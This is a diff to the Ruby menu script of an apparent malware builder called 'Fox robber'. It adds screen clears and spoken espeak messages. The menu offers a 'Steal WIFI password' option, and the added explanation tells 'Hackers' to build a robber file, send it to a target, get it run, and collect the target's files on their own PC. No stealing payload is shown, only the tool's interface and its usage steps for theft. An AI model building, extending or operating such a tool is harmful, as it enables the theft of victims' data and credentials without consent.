@@ -67,11 +67,10 @@ while true
         break
       elsif %w[5 linux].include?(command_fox_robber)
         while true
+          system('clear')
           if %w[0 back].include?(command_fox_robber)
-            system('clear')
             break
           else
-            system('clear')
             puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
             job = 'fox-robber [linux]'
             print "(#{job})>"
@@ -103,6 +102,7 @@ while true
   when '2', 'help'
     helper = All::Help.new
     helper.help
+    system('espeak \'First enter 1 or fox-robber to make robber file. Then you see a lot of option to make robber file. It too fucking easy.[0] back\'')
     while true
       job = 'help'
       print "(#{job})>"
@@ -118,6 +118,8 @@ while true
   when '3', 'explain'
     describe = All::Explain.new
     describe.explain
+    system('espeak \'Hi Hackers.
+      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.  How to use it?(1) First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.(2) Send the file for your target.(3) Run the file.(4) The END. you copied your target data and you can see your targets files in your PC.[0] back. Write \"exit\" to exit in first page.\'')
     while true
       job = 'explain'
       print "(#{job})>"
